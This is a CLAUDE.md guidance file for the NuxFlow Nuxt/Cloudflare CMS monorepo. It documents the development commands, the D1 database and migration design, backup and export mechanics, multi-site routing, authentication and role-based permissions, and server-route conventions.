# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Commands

```bash
# Dev server — runs `wrangler dev` under the hood (localhost:8787, D1 auto-provisioned).
# This is the only supported local dev workflow; there is no separate `nuxt dev` path.
pnpm dev

# Unit tests (Vitest — tests/unit/**)
pnpm test                                   # all packages
pnpm --filter @nuxflow/app test             # app only
pnpm --filter @nuxflow/app test:watch

# Integration tests (Vitest — tests/integration/**)
pnpm --filter @nuxflow/app test:integration
pnpm --filter @nuxflow/app test:integration:watch

# Run both unit and integration together
pnpm --filter @nuxflow/app test:all

# E2E tests (Playwright, requires running dev server)
pnpm test:e2e

# Type check and lint
pnpm typecheck
pnpm lint

# Regenerate Cloudflare runtime types (KVNamespace, D1Database, WorkerLoader, SendEmail, etc.)
# from wrangler.toml bindings + .env vars — apps/nuxflow/worker-configuration.d.ts is committed,
# but must be regenerated after changing wrangler.toml bindings or adding/removing env vars.
cd apps/nuxflow && pnpm run cf-typegen

# Database — D1 only. Migrations apply automatically on cold start; there is no
# manual migrate command.
pnpm --filter @nuxflow/db generate      # generate migration after schema change
pnpm --filter @nuxflow/db studio        # Drizzle Studio — point DB_LOCAL_PATH at the
                                         # local D1 sqlite file under apps/nuxflow/.wrangler/

# Build and deploy — run from apps/nuxflow; wrangler handles the build step automatically
cd apps/nuxflow && pnpm run deploy
```

**Always use `pnpm`, never `npm`.**

## Architecture

### Monorepo layout

```
apps/nuxflow/          # Main Nuxt 4 app (the CMS)
packages/canvas/       # Canvas page builder engine (blocks, editor, types) — @nuxflow/canvas
packages/db/           # Drizzle schema and migrations (D1-only — no client factory)
packages/cli/          # `nuxflow` CLI — scaffold, build, and deploy dynamic plugins/themes
themes/default/        # theme.css — canonical CSS token/selector reference for theme authors (see docs/development.md)
docs/                  # User-facing documentation (markdown)
```

`packages/db` is linked as a workspace dep; schema changes in `packages/db/src/schema/` are immediately visible to the app with no build step.

### Database layer

Cloudflare D1 is the only supported database — there is no alternate backend. `apps/nuxflow/server/utils/db.ts` — `useDb(event)` returns a Drizzle instance backed by the D1 binding (`event.context.cloudflare.env.DB`), and throws a clear error if no binding is present. It also checks `globalThis.__env__?.DB` so it works inside Nitro scheduled tasks where no H3 event is available. `getD1(event)` returns the same binding **raw** (bypassing Drizzle) for code that needs direct SQL — currently only `server/utils/d1-export.ts`'s whole-database export, which introspects `sqlite_master`/`PRAGMA` output Drizzle's query builder has no way to express. `packages/db` exports the schema (`@nuxflow/db/schema`) plus shared, table-aware query builders (`@nuxflow/db/queries` — `paginate()`, `countRows()`, taxonomy/feed helpers) that take an already-built `Db` as a parameter; there is still no client factory, since D1 instances can only be constructed from a live binding, not a URL/token pair. App-specific helpers that need request context (site-scoped `*OrThrow` lookups, pagination query-string parsing) stay in `apps/nuxflow/server/utils/` (`resource-queries.ts`, `content-queries.ts`, `db-helpers.ts`, `pagination.ts`).

**Migrations run automatically** on cold start via `server/middleware/00.migrate.ts`. SQL files are bundled into the Worker as server assets (`packages/db/migrations/`). Never hand-run migrations in production; just deploy. For schema changes: edit `packages/db/src/schema/*.ts`, run `pnpm --filter @nuxflow/db generate`, commit both the schema and the generated SQL. Some migrations (virtual FTS5 tables, triggers) can't be expressed in Drizzle's schema DSL and are hand-written directly as `.sql` files — see `migrations/0002_search_index.sql`.

Schema files in `packages/db/src/schema/`:

| File | Tables |
|---|---|
| `sites.ts` | `sites`, `site_settings` |
| `users.ts` | users, sessions, accounts, `user_site_roles` |
| `content.ts` | `content_types`, `content_items`, `content_revisions`, taxonomies |
| `media.ts` | media, folders |
| `forms.ts` | forms, submissions |
| `payments.ts` | membership tiers, subscriptions |
| `system.ts` | plugins, themes, audit logs, webhooks, `rate_limits`, FTS5 `search_index` (raw SQL, see migrations) |

### Backup, restore, and database export

Two distinct mechanisms, at two different scopes — don't conflate them:

**Per-site backup** (`server/utils/backup.ts`, `GET /api/v1/backup`, `POST /api/v1/restore`) — a self-contained `.zip` (or `.json` for content-only) covering the *current site only*: content, content types, taxonomies, menus, forms, settings (decrypted to plaintext for portability — `SENSITIVE_SETTING_KEYS` are re-encrypted under the target deployment's own secret on restore), media (bundled into the zip up to a 100 MB cap), themes/dynamic plugins, **and team members' roles + membership tiers**. Themes and plugins are included because their real payload (CSS, plugin server/client code) lives only in KV, never in D1 — a D1-only export would silently miss them. Restored themes/plugins always come back **inactive** (never auto-activates over what's live), and restored plugin code is re-verified byte-for-byte (checksum + Ed25519 signature + publisher-key trust pinning, mirroring `dynamic-plugins/index.post.ts`) since a `.zip` is user-editable before upload. `conflictMode: 'archive'` behaves like `'skip'` specifically for plugins: `dynamicPlugins.id` is a **globally** unique primary key (the publisher's manifest id, doubling as the KV key segment) rather than scoped per site like every other table here — restoring a plugin id already installed on a *different* site skips cleanly instead of hitting a raw `SQLITE_CONSTRAINT_PRIMARYKEY`. Gated by `requireRole(event, 'admin')` — **site-scoped**, matching its site-scoped data.

Users are matched by email (accounts are global, not per-site) via `findOrCreateUserAccount()` in `server/utils/user-provisioning.ts` — shared with the invite flow (`POST /api/v1/users`), since both need the exact same "find this email, or create a fresh account for it" step; restoring onto a brand-new deployment means none of the original site's users exist there yet, so a missing account gets provisioned (temp password + a real "set your password" email, same as an invite) and a role assigned. Never restores `super_admin` — `buildBackup()` excludes it outright, so a `.zip` (user-editable before upload) can never be a path to smuggling super-admin access onto a different site. Membership tiers are plan/pricing *configuration* — deliberately **not** `subscriptions`: a subscription row copied onto a different deployment would look migrated but silently desync, since the payment provider's webhook still points at the original deployment. Moving a site with paying subscribers needs that webhook manually repointed afterward; no backup format can automate it. API keys aren't included either — only their one-way hash is ever stored, so a copied row could never actually work; regenerate them on the target site instead.

**Whole-instance D1 export** (`server/utils/d1-export.ts`, `GET /api/v1/admin/db-export`, Admin → Super Admin → Database) — a raw, standalone `.sql` dump of *every table for every site* in this D1 database, restorable via `wrangler d1 execute <database> --remote --file=...`. Exists because `wrangler d1 export` is CLI-only (it shells out to Cloudflare's API from a developer's machine; a live Worker has no way to invoke it), so this reimplements the same idea from inside a request: introspects the actual schema via `sqlite_master`, wraps the whole thing in one transaction with `PRAGMA defer_foreign_keys=TRUE` (so insert order doesn't have to be perfect for correctness, matching how `sqlite3 .dump` handles the same class of problem), and skips FTS5 shadow tables' data (`search_index_data`/`_idx`/`_docsize`/`_config`) since those regenerate for free from the AFTER-INSERT triggers on their source table once it's restored. Unlike the per-site backup, sensitive settings are **not** decrypted here — they're dumped exactly as stored (ciphertext). Gated by `requireSuperAdmin(event)`, not `requireRole('admin')`, since it's cross-tenant by nature — a regular site admin has no business downloading every other site's rows.

**Streamed straight to the HTTP response, not buffered** (`server/api/v1/admin/db-export.get.ts`) — `prepareD1Dump(event)` resolves schema introspection (small, bounded regardless of database size) before any bytes reach the client, so a failure there can still become a clean, labeled 500. Row data cannot be bounded the same way for a real deployment, so `streamD1TableData(event, dataTables, write)` writes each generated chunk straight to a `TransformStream` wired to the response via `sendStream()` (the same pattern `server/api/v1/import/wordpress.post.ts` already uses for its import-progress stream) as it's produced, never holding more than one page's worth of SQL text in memory. `generateD1SqlDump()` is a buffering convenience wrapper around the same two functions that returns the whole dump as one string — used by tests, but **must never be used by the live HTTP route**: buffering reintroduces exactly the failure mode #5 below describes. Because the HTTP response's 200 status and attachment headers are already committed before row-streaming even starts, a failure partway through can no longer become an HTTP error response — it's surfaced as a trailing `-- EXPORT FAILED: ...` comment with a deliberately-missing `COMMIT;`, so a truncated file is obviously identifiable as a failed/incomplete export rather than silently passing as a complete one. The admin UI (`app/pages/admin/super/database/index.vue`) detects this by reading the downloaded blob's text for that marker before offering the file for download, since `res.ok` alone can't tell the two cases apart anymore.

**Deliberately issues zero PRAGMA calls against D1 and zero `d1.batch()` calls for row data** — this feature went through five separate real-deployment failures to arrive at that, none of them reproducible against `wrangler dev`'s local D1 emulation:

1. **PRAGMA-in-batch rejected.** An earlier version used `PRAGMA table_info`/`PRAGMA foreign_key_list` (both on Cloudflare's own documented-supported list — https://developers.cloudflare.com/d1/sql-api/sql-statements/) batched via `d1.batch([...])`, to avoid a *different* problem: one D1 round trip per table (this schema has 30+ tables) risked tripping Workers' per-invocation subrequest ceiling, since D1 binding calls count against it. Batching fixed that but broke PRAGMA in the same motion — D1's authorizer rejects both PRAGMAs when run inside a batch (`D1_ERROR: not authorized: SQLITE_AUTH`) even though it accepts them standalone.
2. **`_cf_KV` access denied.** D1's own internal bookkeeping table (backing its KV-compatible API surface) shows up in a `sqlite_master` scan like any real table, but D1's authorizer hard-blocks *any* query against it, including a plain `SELECT` (`D1_ERROR: access to _cf_KV.key is prohibited: SQLITE_AUTH`) — nothing to do with PRAGMA or batching, just a schema scan that didn't yet know to skip it.
3. **Isolate memory limit on a large batch.** After PRAGMA was dropped, `SELECT *` for every data table was still batched together in one `d1.batch()` call (plain SQL, not PRAGMA, so it batches without the auth issue above) — but that made D1 hold every table's *complete* result set in its own isolate's memory simultaneously, which 500'd with `D1_ERROR: D1 DB's isolate exceeded its memory limit and was reset` against real production data. A fresh/near-empty local dev database has nothing to reproduce this with.
4. **Isolate memory limit on a single fixed-size page.** Switching to one-table-at-a-time pagination fixed #3, but a *single* page of 1000 rows on `content_items` alone (offset 0, first table, first page) still hit the same isolate-memory rejection — this schema's rows (a full TipTap/canvas JSON document per row) are large enough that even one non-batched page can overflow D1's per-isolate ceiling. Cloudflare documents a 2 MB max row size and (per https://developers.cloudflare.com/d1/platform/limits/) a 1,000-queries-per-invocation cap on paid plans, but no explicit rows-per-query or response-size-per-query figure — so no fixed page size is provably safe for every deployment's row-size profile. Fixed by making the page size *adaptive*: `streamD1TableData()` starts each table at `INITIAL_ROWS_PER_PAGE = 1000` and, on an isolate-memory rejection specifically (matched by message text via `isIsolateMemoryError()`), quarters the page size and retries the *same* offset, down to a floor of `MIN_ROWS_PER_PAGE = 10` — a rejection at the floor throws a clear terminal error naming the table and offset rather than looping forever, since at that point a single row is itself too large for this path. A separate `MAX_D1_QUERIES = 900` budget (comfortably under Cloudflare's documented 1,000/invocation cap) bounds the whole export so a pathologically large database fails fast with a message pointing at the CLI tool instead of running out mid-file.
5. **Worker's own memory limit, separate from D1's.** Fixing #4 (D1's per-query isolate memory ceiling) surfaced a *different* limit on the next real deploy: `Error: Worker exceeded memory limit` — this Worker's own isolate memory cap (Cloudflare Workers' documented ~128 MB per-isolate ceiling), nothing to do with D1's own limits at all. The per-table pagination in #3/#4 correctly kept each individual D1 query small, but the generated SQL text for *every* table was still being pushed into one `parts: string[]` for the whole database and returned as a single string only once every table was done — so a real deployment's total dump size (hundreds of MB of escaped/hex-encoded SQL text once every table is included) blew this Worker's own memory regardless of how carefully the D1 side was paginated. Confirmed via `wrangler tail`, which logged the request as `Exceeded Memory Limit` before any application code ever ran (the client only ever saw a bare `503` with no JSON body — the giveaway that this was a platform-level kill, not this route's own `createError` path, which always returns valid JSON). Fixed by splitting the export into `prepareD1Dump()` (schema only, still small/bounded) and `streamD1TableData()` (row data, written via a callback immediately instead of accumulated) — see the streaming paragraph above.

The current design avoids all five at once: table dependency order falls back to `sqlite_master`'s own alphabetical order (correctness never depended on real ordering — the output file's `PRAGMA defer_foreign_keys=TRUE` covers that on restore, and that line is only ever written as text, never executed by this Worker), column names come from `Object.keys()` of each table's own first returned row instead of `PRAGMA table_info`, the `sqlite_master` scan excludes `_cf_%`-prefixed names alongside SQLite's own `sqlite_%`, rows are fetched **one table at a time, adaptively paginated** (`SELECT ... LIMIT ? OFFSET ?`, backing off per-table on a memory rejection as described above), and every generated chunk is **streamed out immediately** rather than accumulated anywhere for the whole database. The `step()` helper wraps each D1-facing call (the `sqlite_master` query, each table's `COUNT(*)`, each page's `SELECT`, labelled with its offset and page size) so a D1-level rejection is diagnosable from its label alone instead of needing a `wrangler tail` session, the way all five of the above did.

General lesson for any new D1-facing code in this file or `d1-stats.ts`: `wrangler dev`'s local D1 emulation is not a reliable stand-in for real D1's (or the Workers platform's own) behavior — verify against an actual deploy before calling D1-facing work done, and prefer avoiding both PRAGMA and `d1.batch()` in this codebase's D1-facing code where there's a real-row-data equivalent, given how many undocumented ways both have now failed here. Also prefer checking Cloudflare's current published limits (`https://developers.cloudflare.com/d1/platform/limits/` and `https://developers.cloudflare.com/workers/platform/limits/`) over guessing a fixed number through repeated deploy-test cycles — the adaptive-backoff fix for #4 came from doing exactly that, and the actual cause of #5 (the Worker's own memory limit, not D1's) was only found by checking a live `wrangler tail` capture rather than assuming the next 500-family error was more of the same D1-side problem. Across this feature and `d1-stats.ts`'s `page_count`/`page_size` PRAGMA rejection, getting whole-database introspection working took **six** separate real-deployment round trips to surface — PRAGMA support gaps, PRAGMA-in-batch, `_cf_KV`, isolate memory on a batch, isolate memory on a single fixed-size page, and the Worker's own memory limit on a buffered response — none of them visible locally. Budget for that when touching either file again rather than assuming one deploy will confirm a fix.

**Database size monitoring** (`server/utils/d1-stats.ts`, `GET /api/v1/admin/db-stats`, same Admin → Super Admin → Database page) — exists because D1 is capped at 10 GB per database on paid plans (500 MB free) with no per-database fee, and Cloudflare's own stated design philosophy is "optimized for per-user, per-tenant, or per-entity database patterns rather than single large databases." A busy multi-tenant install is expected to outgrow one shared D1 and split into multiple independent Worker+D1 "pools" (same codebase, different `database_id`, a subset of tenant domains routed to each) well before hitting that cap — this endpoint is what lets an operator actually see that coming. There is no authoritative on-disk size available from inside a Worker: D1 only supports a fixed PRAGMA subset (`table_list`/`table_info`/`index_list`/`foreign_key_list`/etc. — see https://developers.cloudflare.com/d1/sql-api/sql-statements/), which does **not** include `page_count`/`page_size` — an earlier version of this endpoint tried exactly that and 500'd in production the moment it ran against real D1 (works fine against `wrangler dev`'s local libSQL-backed D1 emulation, which silently tolerates PRAGMAs the real service rejects — that gap didn't show up until an actual deploy). So `approxDatabaseSizeBytes` is a same-methodology **sum of the per-site breakdown** (`LENGTH()` sums over `content_items`/`content_revisions`/`media`, grouped by `site_id`) — good enough to answer "is it time to plan a second pool," not precise enough to budget the exact remaining headroom; the real number Cloudflare's own dashboard shows comes from their control-plane D1 REST API, which needs an account-level API token this app doesn't currently store. The per-site breakdown also flags any site relying on the local base64-in-D1 media fallback, since that's the single biggest avoidable contributor to database size. Uses the raw `getD1()` binding rather than Drizzle's query builder — same reason `d1-export.ts` does (see below): `D1Database.prepare().all()`'s `{ results: T[] }` contract is Cloudflare's own stable, documented one, unlike Drizzle's `.values()`/`.raw()`, whose row shape was separately found to differ between the real D1 adapter and the libSQL driver this project's integration-test harness uses locally — worth keeping in mind before trusting that method's shape anywhere new, and another reason local-only testing isn't sufficient for D1-facing code in this codebase; verify against a real deploy before treating it as done.

### Search

`GET /api/v1/search` queries the `search_index` FTS5 virtual table (title + porter-stemmed body) and is kept in sync automatically by SQLite triggers on `content_items` (`AFTER INSERT/UPDATE/DELETE`, defined in `migrations/0002_search_index.sql`) — there is no application-level indexing code, so every write path (API, setup wizard seeding, demo reset) stays in sync for free. Only `status = 'published' AND visibility = 'public'` items are indexed; the indexed body is `COALESCE(excerpt, seo_description, '')`, not the full rendered content.

### Multi-site and request context

`server/middleware/02.multi-site.ts` resolves the current site from the `Host` header and sets:
- `event.context.siteId` — all DB queries must be scoped by this
- `event.context.siteStatus` — `'active' | 'maintenance' | 'suspended'`
- `event.context.setupCompleted`

**Single-site fallback:** if no site matches the incoming domain but exactly one site exists in the database, that site is used. In production this also self-heals by updating the stored domain to match the live request host — so sitemaps, invite links, and RSS feeds automatically correct after a domain migration.

**Adding additional sites:** create the site record via the super admin panel at `/admin/super/sites/new` (`POST /api/v1/admin/sites`). This generates a one-time setup token and displays it embedded in a full setup URL — `https://{domain}/setup?token={setupToken}` — shown only once (only the SHA-256 hash is persisted). Send that exact URL to whoever will configure the site; there's no field to paste the token manually, it must be picked up from the `?token=` query string. Visiting the bare domain's `/setup` without the token in the URL fails with 403 "Invalid or missing setup token."

Visiting that link runs the *same* `/api/v1/setup/complete` wizard used for the first-ever install — `isInitialSetup` (no sites or no users yet) takes the fresh-install path; an existing, uncompleted site record with a matching domain takes the secondary-site path instead, which requires the token to match the stored hash before proceeding, then burns it (clears `setupTokenHash`) so the link can't be replayed. Either path fully seeds the new site — content types, homepage, taxonomies, and the completing user's account get `super_admin` on that site — it is not a blank shell requiring manual configuration afterward. A failed/missing-token attempt is a no-op (nothing is written), so the same link can be retried until it succeeds.

Setup and auth routes (`/api/v1/setup`, `/api/auth`) bypass multi-site resolution.

`server/middleware/01.d1-cache.ts` ensures the module-level D1 singleton in `db.ts` is always populated before auth routes run (auth config has no per-request event access).

### Auth and permissions

**Password hashing** (`server/utils/argon2.ts`, wired into Better Auth via `server/utils/pw.ts`'s `nuxflowPasswordHasher`) — Argon2id (OWASP 2024 first choice, m=19456 KiB, t=2, p=1) runs directly in the main Worker using `@noble/hashes`' pure-TS implementation (audited, zero dependencies, no WASM instantiation). Benchmarked at ~150-175ms per hash — comfortably inside the Workers Paid plan's CPU budget, and the library yields to the event loop every ~10ms so it doesn't stall other concurrent requests sharing the isolate. This used to run in a separate service-bound Worker (`workers/argon2-hasher`), partly to keep CPU-heavy work isolated and partly as a Free-plan compatibility fallback (binding absent → scrypt). Both no longer apply: CPU time pools across a service-binding call rather than getting its own budget (so the isolation bought nothing on the Paid plan), and NuxFlow now targets a Workers Paid plan minimum (the same baseline dynamic plugins already require, see below) — so the separate Worker and its `pnpm dev` friction were removed. **This project therefore requires the Cloudflare Workers Paid plan to run at all**, not just for dynamic plugins.

Auth is handled directly by the `better-auth` package — there is no Nuxt auth module in this codebase. (An earlier version depended on `@onmax/nuxt-better-auth`/`@nuxtjs/better-auth` purely for client composable bootstrapping; it was removed pre-release after upgrading it failed to fix an unrelated `nuxt typecheck` bug — see the content-route note below — and its own usage surface here was small enough to hand-roll instead of carrying an unstable dependency.)

- **`server/utils/better-auth.ts`** (`getOrCreateBetterAuth(event)`) builds and caches (per incoming `Host` header, 5-minute TTL) the single real `betterAuth({...})` instance. `server/api/auth/[...all].ts` and `server/middleware/04.auth-override.ts` route every `/api/auth/**` request to it — it's what signs users in, sets session cookies, sends password-reset and email-verification emails, and performs Google/GitHub OAuth. Cached per-`Host` rather than a single shared slot because `socialProviders` credentials can differ per site — see below.
- Sessions are read server-side via `requireSession(event)` (throws 401) or `getAuthSession(event)` (returns `null`), both from `server/utils/auth.ts`.
- **Client-side stack**: `app/utils/auth-client.ts` (`createNuxflowAuthClient()`, a plain `createAuthClient()` from `better-auth/client` + `@better-auth/passkey/client`'s `passkeyClient()`, with the same origin-resolution logic multi-site custom domains need) → `app/plugins/auth-client.ts` (isomorphic plugin, provides `$authClient` — must run on both SSR and client since some pages call `useSignIn()` at top-level `<script setup>`) → `app/composables/useAuth.ts` (`useAuthClient()`, `useUserSession()`, `useSignIn()`). SSR session hydration is a small hand-rolled bridge, not Better Auth's own reactive session atom: `GET /api/v1/auth/session` (thin wrapper around `getAuthSession(event)`) is fetched once by `app/middleware/session.global.ts` into a `useState('auth:user', ...)` null-sentinel, the same pattern `setup-guard.global.ts` already uses. Because nothing ever calls the Better Auth client's own `.useSession()`, its internal session-atom lifecycle (polling, focus-refresh, cross-tab `BroadcastChannel` sync) never activates — a deliberate scope reduction, not an oversight: a sign-out in one tab won't be reflected in another until a hard reload. `session.global.ts` also handles the guest-redirect (bounce an authenticated visitor away from `/login`/`/register`) that a Nuxt auth module would otherwise provide as a config option.
- **Historical typecheck bug, now fixed, unrelated to auth**: `app/pages/admin/content/[id].vue` and `.../content/index.vue` used to fail `nuxt typecheck` with `error TS2322: Type '"PATCH"'/'"DELETE"' is not assignable to type '"GET" | "get" | undefined'` on plain `$fetch(...)` calls. This was long blamed on the (now-removed) auth module, but reproduced identically with that module completely absent from the project — proving the real cause was always independent. Root cause: `/api/v1/content/:id` has sibling routes nested under a `content/[id]/` folder (`comments`, `terms`, `revisions`) alongside the flat `content/[id].get/patch/delete.ts` files; that mix confuses Nitro's `AvailableRouterMethod` template-literal route matching for a bare inline template-literal `$fetch` URL, collapsing the allowed `method` type to `"GET"` only. Fix (already applied at both call sites): assign the URL to a plain `: string`-typed variable before passing it to `$fetch`, which sidesteps the faulty matching path. If this resurfaces on a new route, look for the same file+nested-folder pattern under a dynamic segment before suspecting any module.

**Social login credentials** — `NUXT_GOOGLE_CLIENT_ID`/`NUXT_GOOGLE_CLIENT_SECRET`/`NUXT_GITHUB_CLIENT_ID`/`NUXT_GITHUB_CLIENT_SECRET` env vars are the deployment-wide default; a site can override them via `auth.google_client_id` / `auth.google_client_secret` / `auth.github_client_id` / `auth.github_client_secret` site settings (Admin → Settings → Integrations → Social Login), resolved through the usual `resolveSetting()` DB-first-env-fallback pattern. GitHub OAuth Apps only support one callback URL each, so multi-domain GitHub login requires this per-site override; Google supports multiple redirect URIs on one client, so the shared default usually covers every domain already. Saving new credentials calls `clearBetterAuthCache()` to bust the per-host cache immediately rather than waiting out the 5-minute TTL.

**Passkeys in local dev** — `better-auth.ts` binds the WebAuthn RP origin/rpID (and dev-mode `baseURL`) to the *incoming request's* `Host` header, not to `NODE_ENV` or `config.public.siteUrl`. Both of those are unreliable signals locally: `wrangler dev` always builds with `NODE_ENV=production` (see the Nuxt config note below), and `config.public.siteUrl` resolves to workerd's own loopback bind address (`http://127.0.0.1:PORT`) rather than the browser's actual `http://localhost:PORT` origin — either one breaks WebAuthn's exact-origin check and makes passkey register/login fail client-side with a SecurityError before any request is sent. The per-host `_cachedBetterAuth` cache key is the *full* `Host` header (not just the hostname) because `wrangler dev` has been observed to occasionally omit the port on some request types — keying by full host prevents a malformed port-less build from being cached and served to later, correctly-ported requests for the rest of the 5-minute TTL.

**Permission helpers** in `server/utils/permissions.ts`:
- `requireAuth(event)` → `{ userId, role }` — validates session + looks up `user_site_roles` for the **current site**. Throws 403 when no row exists **unless** the caller is a super admin, in which case they still get a `'viewer'` fallback (see the cross-site note below) — a plain stranger with a valid account on some *other* site in this multi-tenant install gets rejected outright, not silently downgraded to `'viewer'`. User accounts are global across the whole D1 instance (`users`/`accounts` carry no `siteId`) and login has no site-membership check, so without this a user invited to Site B (or self-registered on Site A, if public registration is enabled there) could authenticate on Site C's domain and read Site C's admin-only data — drafts, private/members-only content, media library — despite never having been invited there.
- `requireRole(event, minimum)` — throws 403 if role rank is below minimum; **site-scoped**
- `requireSuperAdmin(event)` — checks for a `super_admin` role entry on **any site**, not just the current one

This cross-site vs site-scoped distinction matters: a super admin on site A automatically has super admin access when visiting site B's domain, but their effective role for content operations on site B defaults to `viewer` unless a `user_site_roles` row exists for that site.

Every route that only needs "any real member of this site" should use `requireAuth` (not a bare session check) — it's the actual site-membership boundary now, not just a formality. Routes that need a *specific* minimum (content mutation, AI generation, etc.) still need their own explicit `requireRole(event, minimum)` on top; `requireAuth` alone does not imply any particular role beyond "has one." AI generation routes (`server/api/v1/ai/*.post.ts`) and menu mutation routes (`server/api/v1/menus/*.ts`) both require `'editor'`, matching the baseline every other mutation route (content, media, taxonomies) already used — don't add a new `requireAuth`-only mutation route without checking whether a role floor belongs there instead.

`GET /api/v1/users/me` — returns `{ role: Role | null, isSuperAdmin }` for the authenticated user. `role` is `null` when the caller has no relationship to the current site and isn't a super admin (mirrors `requireAuth`'s access model above, so client code can trust it rather than assume a fabricated `'viewer'`). This is the only client-side way to get role information; the session object from `useUserSession()` only contains the users table fields.

Roles (ranked): `super_admin > admin > editor > author > member > viewer`

**Promoting/revoking super admin** — `POST` / `DELETE /api/v1/users/:id/super-admin` (both `requireSuperAdmin`-gated) grant or revoke `super_admin` on the *current* site for the target user. This is the lightweight path; the only other way to create a super admin is running someone through the full site-setup wizard (`/api/v1/setup/complete`), which also reseeds the site's content types/homepage/taxonomies as a side effect — too heavy just to promote someone. Revoke downgrades to `'admin'` rather than deleting the row, and blocks self-revocation (an admin could otherwise strip their own super-admin status with no recovery path short of another super admin stepping in from a different site). Because `hasSuperAdminRole()` treats "a `super_admin` row on *any* site" as platform-wide status, a user can hold independent grants on multiple sites — revoking one doesn't touch the others.

**Inviting users** — `POST /api/v1/users` (site-scoped `requireRole('admin')`) creates the account (if new — via `findOrCreateUserAccount()` in `server/utils/user-provisioning.ts`, shared with the per-site backup's users restore, see above) and a `user_site_roles` row, then emails either a real password-reset-style "set your password" link (brand-new account — see the comment in `index.post.ts` for why this is the *only* email a new invitee gets, not a separate dead-end "you've been invited") or a plain "you've been added" notice (existing account, new site). There's no separate invitations table — `GET /api/v1/users` infers a `pending: boolean` per user from whether they've ever established a session at all, and `POST /api/v1/users/:id/resend-invite` (`requireRole('admin')`) re-sends the same set-password email for when the original expired or never arrived. Inviting is always scoped to whatever site's admin panel the inviter is currently on (`event.context.siteId`) — there's no cross-site "invite this user to a different domain" picker; a super admin has to actually navigate to that other site's domain first.

**API key auth** — `server/middleware/03.api-key-auth.ts` handles `Authorization: Bearer <key>` requests. On a valid key it sets `event.context.apiKeyUserId` and `event.context.apiKeyRole` from `user_site_roles` for the current site — but only when that row still exists. Removing a user from a site (`DELETE /api/v1/users/:id`) only deletes their `user_site_roles` row, not their API keys, so a missing row here means access was revoked after the key was issued; both context fields are left **unset** in that case rather than defaulting to `'viewer'`, since every consumer (`content/index.get.ts`, the public pages preview, `mcp.ts`) treats `apiKeyUserId`'s mere presence as "this is an authenticated request." Routes that want to support headless API access should check these context fields in addition to session auth.

### Admin UI access control (client-side)

Presentation-layer only — the server-side helpers above are the real boundary; this just keeps the UI from showing (or silently failing on) sections a role can't use.

- `app/utils/admin-nav.ts` — the single source of truth: `ADMIN_NAV`/`SUPER_ADMIN_NAV` list every admin section with its `minRole` (or `superAdminOnly`), matching each section's actual server-side minimum (see the per-route roles documented above and in `server/api/v1/**`). `canAccessNavItem()` and `findNavRule()` (longest-prefix match) both read from these same two arrays.
- `app/composables/useAdminAccess.ts` — `fetchAdminAccess()` fetches `/api/v1/users/me` once per app lifetime into a `useState('admin:access', ...)` null-sentinel (same pattern as `session.global.ts`'s `auth:user`), shared between the sidebar and the route guard so navigating around `/admin` doesn't refetch on every page.
- `app/middleware/admin-role-guard.global.ts` — bounces direct navigation to a section the current role can't use to `app/pages/admin/forbidden.vue`. Deliberately does **not** gate on `useUserSession().loggedIn`: global middleware files run in filename order, and `admin-role-guard` sorts before `session` — that state is still the unset sentinel the first time this runs on a fresh SSR request, so `loggedIn.value` would read `false` regardless of the real session. It calls `fetchAdminAccess()` directly instead, which does its own independent authenticated fetch and isn't affected by that ordering (a `null` result already means "no session" either way).
- `app/components/admin/Sidebar.vue` filters `ADMIN_NAV`/`SUPER_ADMIN_NAV` through `canAccessNavItem()` before rendering, so a role never sees a link to a section it can't open.

### Server route conventions

- Files use `[id].ts` (not `[id].js.ts`) — radix3 breaks param extraction with double extensions
- HTTP method is set via file suffix: `index.get.ts`, `index.post.ts`, `[id].patch.ts`, etc.
- All handlers validate input with Zod using `parseBody(event, schema)` or `parseQuery(event, schema)` from `server/utils/validate.ts`
- All mutations write an audit log via `writeAuditLog(event, userId, opts)` from `server/utils/audit.ts`
- IDs are generated with `ulid()` — never use `crypto.randomUUID()` or `node:crypto`
- Crypto operations (signing, hashing) use `globalThis.crypto.subtle` (Web Crypto API) — never `node:crypto`
- Use response helpers from `server/utils/response.ts`: `ok(data)`, `created(event, data)`, `noContent(event)`, `notFound()`, `forbidden()`, `conflict()`, `validationError()` — do not throw raw `createError` for these common cases

### Scheduled tasks

The pattern is a two-layer split:
- **`server/scheduled/`** — plain TypeScript modules containing the business logic as exported functions (e.g. `publishScheduled()`). These are not auto-discovered by Nitro.
- **`server/tasks/`** — thin `defineTask()` wrappers that import and call the logic functions. Nitro only discovers tasks from this directory.

Each file in `server/tasks/` corresponds to a task name registered in `nitro.scheduledTasks` in `nuxt.config.ts`. `experimental.tasks: true` must be set in the Nitro config for the task system to function. **Never add a file only to `server/scheduled/` and expect it to run on a schedule** — a matching `server/tasks/` wrapper is always required.

Tasks run without a request context. `useDb()` handles this by falling back to `globalThis.__env__?.DB`, which Nitro populates from the Cloudflare bindings object before firing the `cloudflare:scheduled` hook.

### Cloudflare-specific utilities

**Runtime types**: `apps/nuxflow/worker-configuration.d.ts` is generated by `pnpm run cf-typegen` (wraps `wrangler types`) and provides the real ambient Cloudflare types — `KVNamespace`, `D1Database`, `WorkerLoader`/`WorkerLoaderWorkerCode`, `WorkerStub`, `SendEmail`, `AnalyticsEngineDataset`, etc. — sourced from Cloudflare directly rather than hand-written, so they can't drift from the real runtime API (this matters most for `worker_loaders`, a newer/beta binding). It's committed to git; re-run `cf-typegen` after changing `wrangler.toml` bindings or `.env` vars. `server/types/cloudflare-bindings.d.ts` only covers what's genuinely NuxFlow-specific and not a Cloudflare primitive: the `declare module 'h3'` augmentation wiring `event.context.cloudflare.env` to `NuxFlowCloudflareEnv`. Because this project's `nuxt typecheck` runs as a single unified program (app + transitively-reachable server files, not fully isolated by `tsconfig.server.json` — there's no TS project-references setup), the generated file lives at the project root (`apps/nuxflow/worker-configuration.d.ts`, Wrangler's own default location) rather than under `server/`, so it reaches every file that needs it. Mixing workerd's global types into the same program as `dom` lib is mostly safe but not free — e.g. `Response.json()` resolves to `Promise<unknown>` (workerd) rather than `Promise<any>` (DOM), which can require an explicit cast in client-side `fetch()` call sites that weren't relying on that looseness before.

